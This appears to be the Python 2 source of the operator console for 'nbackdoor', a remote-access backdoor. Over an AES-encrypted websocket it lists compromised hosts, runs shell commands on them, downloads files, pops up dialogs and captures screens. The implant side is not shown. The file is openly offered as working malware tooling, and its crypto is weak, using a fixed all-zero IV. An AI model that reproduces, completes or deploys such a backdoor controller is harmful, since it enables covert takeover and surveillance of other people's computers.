#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import os
import ctypes
import subprocess
import threading
import chardet
import uuid
import json
import time
from base64 import b64decode, b64encode
from websocket import create_connection
from Crypto.Cipher import AES
__author__ = 'nekocode'


class ControllerClient:
    def __init__(self):
        self.SERVER_HOST = 'http://127.0.0.1:8888'
        self.HOST_NAME = hostname()
        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)
        self.ws = None

        self.exit = False

    def run(self):
        while not client.exit:
            try:
                os.system('cls')
                print 'finding server...'
                self.ws = create_connection("ws://localhost:8888/")
                os.system('cls')

                pwd = raw_input('Enter the password:')
                sercret_msg = {'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET), 'pwd': self.encrypt(pwd)}
                self.ws.send(json.dumps(sercret_msg))

                msg = json.loads(self.ws.recv())
                if 'data' not in msg:
                    continue
                data = self.decrypt(msg['data'])
                os.system('cls')
                if data == 'login failed':
                    print 'Login failed.'
                    self.exit = True
                else:
                    print 'Login success!'

                while not self.exit:
                    input_str = raw_input('nbackdoor:')
                    msg = self.command_to_msg(input_str)
                    if msg:
                        self.ws.send(msg)
                        msg = json.loads(self.ws.recv())
                        if 'data' in msg:
                            data = self.decrypt(msg['data'])
                            print data + '\n'

                self.ws.close()

            except Exception as e:
                if self.ws:
                    self.ws.close()
                time.sleep(3)

    def command_to_msg(self, input_str):
        input_array = input_str.split()
        command_str = input_array[0]
        # args_str = input_array[1:]

        command = None

        if command_str == 'help':
            parser = argparse.ArgumentParser(description="nbackdoor by nekocode!!!",
                                             version='0.1.0',
                                             formatter_class=argparse.RawTextHelpFormatter,
                                             epilog='neko!')
            parser.print_help()
        elif command_str == 'list':
            command = 'list'
        elif command_str == 'cmd':
            command = 'cmd'
        elif command_str == 'download':
            command = 'download'
        elif command_str == 'dialog':
            command = 'dialog'
        elif command_str == 'screen':
            command = 'screen'
        elif command_str == 'exit':
            self.exit = True
            return None
        else:
            return None

        return json.dumps({'cmd': self.encrypt(command)})

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return b64encode(ciphertext)

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(b64decode(ciphertext))
        return plain


def hostname():
    sys = os.name

    if sys == 'nt':
        return os.getenv('computername')
    elif sys == 'posix':
        host = os.popen('echo $HOSTNAME')
        try:
            name = host.read()
            return name
        finally:
            host.close()
    else:
        return 'Unkwon hostname'

if __name__ == '__main__':
    client = ControllerClient()
    while not client.exit:
        client.run()


